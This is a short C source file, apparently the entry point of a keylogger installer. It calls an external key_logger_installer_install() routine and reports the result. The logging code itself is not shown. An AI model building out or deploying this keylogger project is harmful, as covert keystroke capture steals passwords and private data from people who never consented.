/******************************************************************************************************
 * HEADER FILE INCLUDES                                                                               *
 *****************************************************************************************************/

#include <stdio.h>
#include <stdlib.h>
#include <inttypes.h>

#include "key_logger_installer.h"

/******************************************************************************************************
 * ENTRY POINT                                                                                        *
 *****************************************************************************************************/

int main(int argc, char* argv[])
{
	bool is_installed_successfully = false;

	if (2L <= argc)
	{
		(void)fprintf(stdout, "Parameters will be ignored!\n");
	}

	is_installed_successfully = key_logger_installer_install();

	(void)fprintf(stdout, "Press Enter to exit...\n");
	(void)getchar();

	return true == is_installed_successfully ? EXIT_SUCCESS : EXIT_FAILURE;
}
